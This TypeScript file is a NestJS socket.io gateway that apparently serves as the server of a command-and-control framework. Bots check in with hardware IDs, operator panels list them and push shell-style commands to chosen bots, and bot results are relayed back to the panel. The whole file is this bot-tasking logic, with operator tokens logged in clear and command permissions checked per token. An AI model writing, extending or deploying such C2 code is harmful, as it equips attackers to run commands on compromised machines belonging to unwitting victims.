import { WebSocketGateway, SubscribeMessage, MessageBody, OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect, WebSocketServer, ConnectedSocket } from '@nestjs/websockets';
import { PattayaMessagesService } from './pattaya-messages.service';
import { Logger, UseGuards } from '@nestjs/common';
import { Server, Socket } from 'socket.io';
import { BotCheckinDto } from './dto/bot-checkin.dto';
import { ResponseMessageDto } from './dto/response-message.dto';
import { PanelAuthGuard } from './guard/panel-auth.guard';
import { ConfigService } from '@nestjs/config';
import { BotAuthGuard } from './guard/bot-auth.guard';
import { PanelSendBotTaskDto } from './dto/panel-send-bot-task.dto';
import { BotTaskDto } from './dto/bot-task.dto';
import { BotSendTaskResultDto } from './dto/bot-send-task-result.dto';

@WebSocketGateway({ 
  namespace: '/',
  cors: {
    origin: '*'
  },
  maxHttpBufferSize: 10e6
})
export class PattayaMessagesGateway implements OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect {

  private readonly logger = new Logger(PattayaMessagesGateway.name);

  @WebSocketServer()
  server: Server;

  constructor(
    private readonly pattayaMessagesService: PattayaMessagesService,
    private readonly panelGuard: PanelAuthGuard,
    private readonly botGuard: BotAuthGuard,  
    private readonly configService: ConfigService
    )  {}

  afterInit(server: Server) {
    this.logger.log('Socket.io server initialized');
    setInterval(async () => {
      const response: ResponseMessageDto = {
        success: true,
        message: 'Greet from server!!!',
      }
      this.server.emit('panel_received_server_heartbeat', response);
      this.logger.log(`Response server heartbeat: ${response.message}`);
    }, this.configService.get<number>('app.server-heartbeat-delay'));
  }

  handleConnection(client: Socket, ...args: any[]) {
    this.logger.log(`Client connected: ${client.id}`);
    let peer = ''
    let token = ''
    try {
      peer = client.handshake.headers.authorization.substring(0, 7)
      token = client.handshake.headers.authorization.replace("###### ", '')
      this.logger.log(`Request token: ${client.handshake.headers.authorization}`);
      switch (peer) {
        case "###### ": {
          if(!this.panelGuard.validateRequest(client)){
            const response: ResponseMessageDto = {
              success: false,
              message: 'Unknown panel tried to connect to server',
            }
            this.server.emit('panel_received_server_heartbeat', response);
            client.disconnect();
          }else {
            const response: ResponseMessageDto = {
              success: false,
              message: 'New panel has join!',
            }
            this.server.emit('panel_received_server_heartbeat', response);
            this.server.emit(`${token}_panel_received_username`, this.panelGuard.getCreds(token));
          }
        break;
        }
          
        case "$$$$$$ ": {
          if(!this.botGuard.validateRequest(client)){
            const response: ResponseMessageDto = {
              success: false,
              message: 'Unknown bot tried to connect to server',
            }
            this.server.emit('panel_received_server_heartbeat', response);
            client.disconnect();
          }else {
            const response: ResponseMessageDto = {
              success: false,
              message: 'New bot has join!',
            }
            this.server.emit('panel_received_server_heartbeat', response);
          }
        break;
        }
        default: {
          const response: ResponseMessageDto = {
            success: false,
            message: 'Unknown peer tried to connect to server',
          }
          this.server.emit('panel_received_server_heartbeat', response);
          client.disconnect();
          break;
        }
      }
    } catch (error) {
      const response: ResponseMessageDto = {
        success: false,
        message: 'Seem Junk request to server!',
      }
      this.server.emit('panel_received_server_heartbeat', response);
      client.disconnect();
    }

  }

  async handleDisconnect(client: Socket) {
    this.logger.log(`Client disconnected: ${client.id}`);
    await this.pattayaMessagesService.botOffline(client.id)
    this.server.emit(`panel_terminal_bot_seem_disconnected_${client.id}`)
    this.requestBotData({}, client)
  }


  getClientById(id: string) {
    return this.server['adapter']['sids'].get(`${id}`)
  }


  @UseGuards(BotAuthGuard)
  @SubscribeMessage('bot_checkin')
  async botCheckin(@MessageBody() botCheckinDto: BotCheckinDto, @ConnectedSocket() client: Socket){
    botCheckinDto.socketId = client.id;
    this.logger.log(`bot checkin request: ${JSON.stringify(botCheckinDto)}`)
    const result = await this.pattayaMessagesService.botCheckin(botCheckinDto)
    this.requestBotData({}, client)
    if(!result) {
      return <ResponseMessageDto>{
        success: false,
        message: "Cannot checkin"
      }
    }
    return <ResponseMessageDto>{
      success: true,
      message: 'Bot checked-in'
    }
  }


  @UseGuards(BotAuthGuard)
  @SubscribeMessage('bot_send_task_result')
  async botSendResult(@MessageBody() botResultDto: BotSendTaskResultDto, @ConnectedSocket() client: Socket){
    this.logger.log(`incoming bot result: ${JSON.stringify(botResultDto)}`)
    const result = await this.pattayaMessagesService.updateTask(botResultDto)

    if(result.success)
    {
      const response: ResponseMessageDto = {
        success: true,
        message: result.data['result'],
      }
      this.server.emit(`${result.data['panelToken']}_panel_terminal_bot_task_result_${result.data['hwid']}`, response)
    } else {
      const response: ResponseMessageDto = {
        success: false,
        message: "Server cannot manipulated task result",
      }
      this.server.emit(`${result.data['panelToken']}_panel_terminal_bot_task_result_${result.data['hwid']}`, response)
    }
  }

  @UseGuards(PanelAuthGuard)
  @SubscribeMessage('panel_request_bot_data')
  async requestBotData(@MessageBody() request: any, @ConnectedSocket() client: Socket){
    this.logger.log(`panel_request_bot_data called: ${JSON.stringify(request)}`)
    const data = await this.pattayaMessagesService.getAllBots()
    const response: ResponseMessageDto = {
      success: true,
      message: 'Bot checked-in',
      data
    }
    this.logger.log(`response to panel_request_bot_data called: ${JSON.stringify(response)}`)
    if(request.token){
      this.logger.log(`emit bot data to event: ${request.token}_panel_received_bot_data`)
      this.server.emit(`${request.token}_panel_received_bot_data`, response)
    }else{
      this.logger.log(`emit bot data to event: all_panel_received_bot_data`)
      this.server.emit(`all_panel_received_bot_data`, response)
    }
  }

  @UseGuards(PanelAuthGuard)
  @SubscribeMessage('panel_send_bot_task')
  async sendBotTask(@MessageBody() request: PanelSendBotTaskDto, @ConnectedSocket() client: Socket){
    this.logger.log(`panel_send_bot_task: ${JSON.stringify(request)}`)

    if(!this.getClientById(request.socketId)){
      const response: ResponseMessageDto = {
        success: false,
        message: `socketId: ${request.socketId} is not active! Close the current terminal and refresh bot list again!`,
      }
      this.server.emit(`${request.panelToken}_server_ack_not_allow_terminal_bot_task_result_${request.hwid}`, response)
      return
    }

    if(this.panelGuard.validateAllowCommand(request)){
      const response: ResponseMessageDto = {
        success: false,
        message: `Sorry! Your token unable to use ***${request.command}*** comamnd`,
      }
      this.server.emit(`${request.panelToken}_server_ack_not_allow_terminal_bot_task_result_${request.hwid}`, response)
      return
    }


    const result = await this.pattayaMessagesService.stampTask(request)
    if(result.success)
    {
      const botTask = <BotTaskDto>result.data
      const response: ResponseMessageDto = {
        success: true,
        message: `Tasked bot ${request.hwid} with command ${request.command}`,
      }
      this.server.emit(`${request.panelToken}_server_ack_terminal_bot_task_result_${request.hwid}`, response)
      this.server.to(request.socketId).emit('bot_receive_task', botTask)
    } else {
      const response: ResponseMessageDto = {
        success: false,
        message: `Failed to stamp bot task`,
      }
      this.server.emit(`${request.panelToken}_server_ack_terminal_bot_task_result_${request.hwid}`, response)

    }
  }
}

